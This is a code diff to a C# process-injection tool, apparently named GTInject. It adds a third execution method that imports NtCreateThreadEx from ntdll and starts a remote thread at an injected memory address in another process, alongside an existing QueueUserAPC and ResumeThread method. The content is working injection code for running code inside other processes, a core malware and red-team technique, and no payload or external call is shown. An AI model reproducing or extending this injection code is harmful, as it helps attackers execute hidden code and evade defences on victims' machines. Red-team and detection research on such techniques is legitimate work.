@@ -13,13 +13,12 @@ namespace GTInject.Injection
             {
                 case 1:
                     return execopt1(memaddr, pid, tid);
-                    break;
                 case 2:
                     return execopt2(memaddr, pid, tid);
-                    break;
                 case 3:
+                    return execopt3(memaddr, pid, tid);
+                case 4:
                     return IntPtr.Zero;
-                    break;
             }
             return IntPtr.Zero;
         }
@@ -39,7 +38,7 @@ namespace GTInject.Injection
         private static IntPtr execopt2(IntPtr memaddr, Process ProcID, int ThreadID)
         {
             /////////////////////////////////////
-            // OPTION 2 == QueueUserAPC & ResumeThread
+            // OPTION 2 == QueueUserAPC & ResumeThread (WINAPI)
             /////////////////////////////////////
             Console.WriteLine( " Thread exec with WINAPI Q User APC and Resume Thread");
             //var threadHandle = OpenThread(ThreadAccess.QUERY_INFORMATION, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
@@ -77,6 +76,20 @@ namespace GTInject.Injection
 
         }
 
+        private static IntPtr execopt3(IntPtr memaddr, Process ProcID, int ThreadID)
+        {
+            /////////////////////////////////////
+            // OPTION 3 == NtCreateThreadEx (NTAPI)
+            /////////////////////////////////////
+            ///
+            //Create a remote thread and execute it.
+            //IntPtr hThread = CreateRemoteThread(hremoteProcess, IntPtr.Zero, 0, remoteBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
+
+            IntPtr hRemoteThread;
+            uint hThread = NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, ProcID.Handle, memaddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
+            return hRemoteThread;
+        }
+
         /////////////////////////////////////
         // Supporting functions
         /////////////////////////////////////
@@ -110,6 +123,10 @@ namespace GTInject.Injection
 
         [DllImport("kernel32.dll")]
         public static extern int ResumeThread(IntPtr hThread);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        public static extern uint NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, [MarshalAs(UnmanagedType.Bool)] bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);
+
 
     }
 }
